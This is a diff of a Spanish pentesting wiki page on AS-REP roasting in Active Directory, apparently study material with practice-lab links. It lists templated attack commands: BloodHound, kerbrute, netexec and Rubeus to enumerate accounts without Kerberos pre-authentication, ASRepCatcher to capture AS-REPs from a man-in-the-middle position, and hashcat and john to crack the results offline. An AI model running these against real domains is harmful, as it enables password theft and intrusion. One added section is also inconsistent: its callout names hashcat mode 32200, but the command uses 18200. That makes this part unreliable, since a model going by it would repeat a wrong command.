@@ -4,31 +4,40 @@ El protocolo de autenticación #Kerberos funciona con tickets para otorgar acces
 
 Un **ST** (*Service Ticket*) se obtiene presentando un **TGT** (*Ticket Granting Ticket*). Ese **TGT** previo se puede obtener validando un primer paso llamado **pre-autenticación**.
 
-
 ![[kerberos-preauth.excalidraw|center]]
 
 El proceso de **pre-autenticación** puede ser eliminado de una cuenta mediante el atributo `DONT_REQ_PREAUTH` (`0x400000: Do not require Kerberos preauthentication`).
 
-
 ![[kerberos-dontpreauth.excalidraw|center]]
 
-Las cuentas con `DONT_REQ_PREAUTH` son vulnerables a [[AS-REProasting]].
+Las cuentas con `DONT_REQ_PREAUTH` son vulnerables a [[AS-REP roasting]].
 
 # Vulnerabilidad
 
 Algunas aplicaciones no soportan la **pre-autenticación** de Kerberos, por lo que es común encontrar usuarios con la opción `DONT_REQ_PREAUTH` habilitada.
 
-Los atacantes pueden solicitar **TGT**s en nombre de cualquier usuario sin saber su contraseña (ya que no necesitan cifrar el *timestamp*) y crackear offline las *Session Keys* recibidas (debido a que van cifradas con su contraseña).
+Los atacantes pueden solicitar **TGT**s en nombre de cualquier usuario sin saber su contraseña (ya que no necesitan cifrar el *timestamp*) y crackear offline las *Session Keys* recibidas (debido a que van cifradas con la contraseña).
 
 # Comprobación
 
-**Con credenciales en el dominio**, es posible listar los usuarios con `DONT_REQ_PREAUTH`:
+Es posible listar los usuarios con `DONT_REQ_PREAUTH` mediante diferentes métodos:
 
 ~~~tabs
+
+tab: bloodhound
+
+```
+MATCH (u:User)
+WHERE u.enabled = true AND u.dontreqpreauth = true 
+RETURN u
+```
+
 tab: kerbrute
 
-<span query="codeBlock(_/variables/hacking.md/domain,_/variables/hacking.md/users, code = kerbrute -domain {{domain}} -users {{users}}, lang = )"></span>
+<span query="codeBlock(_/variables/hacking.md/domain,_/variables/hacking.md/users, code = # fuerza bruta
+kerbrute -domain {{domain}} -users {{users}}, lang = )"></span>
 ``` 
+# fuerza bruta
 kerbrute -domain ${DOMAIN} -users ${USERS}
 ```
 <span type="end"></span>
@@ -53,6 +62,32 @@ ldapsearch -H ldap://${DOMAIN} -D ${DN} -w ${PASS} -b ${BASEDN} '(&(samAccountTy
 <span type="end"></span>
 
 
+tab: netexec
+
+<span query="codeBlock(_/variables/hacking.md/target,_/variables/hacking.md/users, code = # fuerza bruta
+netexec ldap {{target}} -u {{users}} -p '' -k, lang = )"></span>
+``` 
+# fuerza bruta
+netexec ldap ${TARGET} -u ${USERS} -p '' -k
+```
+<span type="end"></span>
+
+<span query="codeBlock(_/variables/hacking.md/target, code = # anonymous
+netexec ldap {{target}} -u '' -p '' --query &amp;#x27;(&amp;amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))&amp;#x27; &amp;#x27;samAccountName&amp;#x27;, lang = )"></span>
+``` 
+# anonymous
+netexec ldap ${TARGET} -u '' -p '' --query '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' 'samAccountName'
+```
+<span type="end"></span>
+
+<span query="codeBlock(_/variables/hacking.md/target,_/variables/hacking.md/user,_/variables/hacking.md/password, code = # credenciales
+netexec ldap {{target}} -u {{user}} -p {{pass}} --query &amp;#x27;(&amp;amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))&amp;#x27; &amp;#x27;samAccountName&amp;#x27;, lang = )"></span>
+``` 
+# credenciales
+netexec ldap ${TARGET} -u ${USER} -p ${PASS} --query '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' 'samAccountName'
+```
+<span type="end"></span>
+
 
 tab: powershell
 
@@ -69,10 +104,18 @@ $ds.FindAll()
 
 tab: Rubeus
 
-<span query="codeBlock(_/variables/hacking.md/users, code = # sesión
+<span query="codeBlock(_/variables/hacking.md/domain,_/variables/hacking.md/users, code = # fuerza bruta
+Rubeus.exe preauthscan /domain:{{domain}} /users:{{users}}, lang = )"></span>
+``` 
+# fuerza bruta
+Rubeus.exe preauthscan /domain:${DOMAIN} /users:${USERS}
+```
+<span type="end"></span>
+
+<span query="codeBlock(_/variables/hacking.md/users, code = # fuerza bruta con sesión
 Rubeus.exe preauthscan /users:{{users}}, lang = )"></span>
 ``` 
-# sesión
+# fuerza bruta con sesión
 Rubeus.exe preauthscan /users:${USERS}
 ```
 <span type="end"></span>
@@ -161,7 +204,26 @@ Rubeus.exe asreproast /outfile:asreproast.txt
 
 ~~~
 
-Es posible **crackear los hashes** mediante los siguientes comandos:
+### ASREProasting via MitM
+
+Otra forma de realizar AS-REP roasting **sin depender de que la pre-autenticación esté deshabilitada** es tener una posición de **Man-in-the-Middle** en la red y capturar AS-REPs:
+
+~~~tabs
+tab: ASRepCatcher
+
+<span query="codeBlock(_/variables/hacking.md/target, code = ASRepCatcher -dc {{target}}, lang = )"></span>
+``` 
+ASRepCatcher -dc ${TARGET}
+```
+<span type="end"></span>
+
+>[!tip] --disable-spoofing / --stop-spoofing
+
+~~~
+
+### Cracking
+
+Es posible **crackear los hashes** obtenidos mediante `netexec`, `GetNPUsers` y `Rubeus` usando los siguientes comandos:
 
 ~~~tabs
 tab: hashcat
@@ -187,9 +249,24 @@ john --wordlist=${WORDLIST} asreproast.txt
 
 ~~~
 
+Es posible **crackear los hashes** obtenidos mediante `ASRepCatcher` usando el siguiente comando:
+
+~~~tabs
+tab: hashcat
+
+>[!tldr] 32200 | Kerberos 5, etype 18, AS-REP
+
+<span query="codeBlock(_/variables/hacking.md/wordlist, code = hashcat -m 18200 asreproast.txt {{wordlist}}, lang = )"></span>
+``` 
+hashcat -m 18200 asreproast.txt ${WORDLIST}
+```
+<span type="end"></span>
+
+~~~
+
 # Entornos de práctica
 
-## Ofensivo
+### Ofensivo
 
 ~~~tabs
 
@@ -286,7 +363,7 @@ image: https://opengraph.githubassets.com/6df3b9c7bb50447380c8c44df0c16fe7b85ecc
 
 ~~~
 
-## Defensivo
+### Defensivo
 
 ~~~tabs
 
